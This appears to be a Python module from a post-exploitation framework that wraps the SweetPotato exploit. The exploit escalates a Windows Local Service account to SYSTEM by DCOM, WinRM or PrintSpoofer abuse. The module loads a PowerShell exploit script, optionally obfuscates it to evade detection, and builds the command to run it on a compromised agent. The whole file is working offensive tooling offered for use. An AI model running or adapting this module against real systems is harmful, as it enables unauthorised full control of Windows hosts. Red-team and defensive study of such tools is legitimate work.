from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Sweet Potato Local Service to SYSTEM Privilege Escalation',

            'Author': ['@_EthicalChaos_ (@CCob)', '@kevin'],

            'Description': 'Abuses default privileges given to Local Service accounts to spawn '
                           'a process as SYSTEM. Tested on Server 2019 and Windows 10 1909 (Build 18363.1316). '
                           'Run a Powershell stager or your own command.',

            'Software': '',

            'Techniques': ['TA0004'],

            'Background': False,

            'OutputExtension': "",

            'NeedsAdmin': False,

            'OpsecSafe': False,

            'Language': 'powershell',

            'MinLanguageVersion': '5',

            'Comments': ['https://github.com/CCob/SweetPotato']
        }

        self.options = {
            'Agent': {
                'Description': 'Agent to run on.',
                'Required': True,
                'Value': ''
            },
#            'Listener': {
#                'Description': 'Listener to generate Powershell agent stager from',
#                'Required': False,
#                'Value': ''
#            },
            'Binary': {
                'Description': 'Full path to the process to spawn. Default: C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe',
                'Required': False,
                'Value': ''
            },
            'CommandArguments': {
                'Description': 'Arguments to pass to the process binary. Default: No arguments',
                'Required': False,
                'Value': ''
            },
            'ListenPort': {
                'Description': 'Port to host internal impersonation server on. Default: 6666',
                'Required': False,
                'Value': ''
            },
            'ExploitMethod': {
                'Description': 'Exploit mode: [DCOM|WinRM|PrintSpoofer]. Default: PrintSpoofer',
                'Required': False,
                'Value': ''
            }
        }
        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-SweetPotato.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-SweetPotato"

        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
                    elif values['Value'].lower() == "false":
                        pass
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])

        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath,
                                          obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
